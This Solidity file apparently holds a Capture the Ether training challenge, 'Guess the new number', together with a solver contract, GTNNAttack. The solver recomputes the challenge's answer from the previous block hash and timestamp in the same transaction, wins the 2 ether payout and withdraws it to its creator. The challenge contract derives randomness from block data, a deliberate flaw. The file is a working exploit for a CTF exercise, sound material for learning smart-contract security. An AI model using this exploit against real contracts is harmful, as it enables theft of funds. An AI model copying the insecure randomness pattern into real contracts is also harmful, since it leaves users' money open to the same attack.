pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract GTNNAttack {
    GuessTheNewNumberChallenge public gtnn;
    address public creator; //payable not available till Solidity v0.5

    function GTNNAttack(address _addr) public {
        gtnn = GuessTheNewNumberChallenge(_addr);
        creator = msg.sender;
        // hackExecute();
    }

    // function predict() public view returns (uint8) {
    //     return uint8(keccak256(block.blockhash(block.number - 1), now));
    // }

    function hack() public payable {
        require(msg.value == 1 ether);
        uint8 ans = uint8(keccak256(block.blockhash(block.number - 1), now));

        gtnn.guess.value(msg.value)(ans);
    }

    // function() public payable {
    //     creator.transfer(msg.value);
    // }

    function withdraw() public {
        creator.transfer(address(this).balance);
    }

    // function fallback() public payable {
    //     creator.transfer(msg.value);
    // }
}
